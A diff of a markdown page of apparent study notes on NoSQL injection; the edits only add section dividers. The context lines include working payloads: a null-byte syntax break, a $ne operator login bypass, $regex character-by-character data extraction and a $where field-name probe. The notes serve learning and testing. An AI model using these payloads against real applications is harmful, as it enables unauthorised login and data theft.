@@ -22,10 +22,14 @@ weight: 16
 
 {{< /details >}}
 
-### Types of NoSQL injection
+---
+
+## Types of NoSQL injection
 
 1. Syntax injection - when you can break the NoSQL query syntax, enabling the injection (likeSQLi).
 2. Operator injection - when you can use NoSQL query operators to manipulate queries.
+
+---
 
 ## NoSQL syntax injection
 
@@ -91,6 +95,8 @@ https://insecure-website.com/product/lookup?category=fizzy'%00
 this.category == 'fizzy'\u0000' && this.released == 1
 ```
 
+---
+
 ## NoSQL operator injection
 
 {{< details summary="Examples of MongoDB query operators" >}}
@@ -141,6 +147,8 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
 * `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
 * This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.
 
+---
+
 ## Extract data
 
 **INSIDE $WHERE**
@@ -173,6 +181,8 @@ MongoDB Query and Projection Operators: [https://www.mongodb.com/docs/manual/ref
   * Different responses? The app may be vulnerable
 * `{"username":"admin","password":{"$regex":"^a*"}}`
   * Extract data character by character
+
+---
 
 ## Identify field names
 
@@ -232,6 +242,8 @@ db.collection.find({ "$where": "Object.keys(this)[0].match('^.{0}a.*')" })
 ```
 
 {{< /details >}}
+
+---
 
 ## Timing based injection
 
